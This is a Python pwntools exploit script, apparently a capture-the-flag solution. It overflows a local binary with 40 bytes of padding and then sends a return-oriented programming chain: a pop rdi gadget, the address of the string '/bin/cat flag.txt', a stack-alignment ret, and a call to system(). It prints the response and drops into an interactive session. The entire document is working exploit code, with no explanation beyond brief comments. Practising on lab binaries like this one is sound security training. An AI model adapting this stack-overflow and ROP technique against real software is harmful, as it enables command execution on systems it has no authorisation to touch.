from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)


p = start()

#x = cyclic(500)
#p.sendline(x)

padding = b'A' * 40
chain = padding

chain += p64(0x4007c3) # pop rdi; ret;
chain += p64(0x601060) # address of "/bin/cat flag.txt"
chain += p64(0x40053e) # ret; for 16 byte alignment of stack
chain += p64(e.sym['system'])

p.recvuntil(">")
p.sendline(chain)

response = p.recvall().decode()
print(response)

p.interactive()

